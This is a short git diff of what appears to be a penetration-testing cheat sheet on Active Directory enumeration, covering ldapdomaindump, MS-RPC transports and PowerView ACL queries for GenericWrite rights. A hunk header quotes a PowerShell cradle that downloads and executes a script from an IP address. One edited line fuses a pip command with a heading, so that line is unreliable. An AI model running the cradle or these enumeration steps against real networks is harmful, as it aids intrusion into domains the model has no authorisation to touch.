@@ -96,15 +96,13 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 ```
 git clone https://github.com/dirkjanm/ldapdomaindump.git
 #or
-pip install ldapdomaindump
+pip install ldapdomaindumpPowerView Cheat Sheet
 
 python ldapdomaindump.py
 #or
 python -m ldapdomaindump
 ldapdomaindump
 ```
-
-###
 
 ### [ADRecon](https://github.com/sense-of-security/ADRecon)
 
@@ -543,9 +541,9 @@ LDAP anonymous binding is usually disabled but it's worth checking
 
 MS-RPC (Microsoft Remote Procedure Call) is a protocol that allows requesting service from a program on another computer without having to understand the details of that computer's network. An MS-RPC service can be accessed through different transport protocols, among which:
 
-#### . a network SMB pipe (listening ports are 139 & 445) 
+#### . a network SMB pipe (listening ports are 139 & 445)&#x20;
 
-#### . plain TCP or plain UDP (listening port set at the service creation) 
+#### . plain TCP or plain UDP (listening port set at the service creation)&#x20;
 
 #### . a local SMB pipe
 
@@ -665,7 +663,7 @@ Get-ObjectACL -SamAccountName user123 -ResolveGUIDs
 Get-objectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
 ```
 
-### GenericWrite 
+### GenericWrite&#x20;
 
 ```
 Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
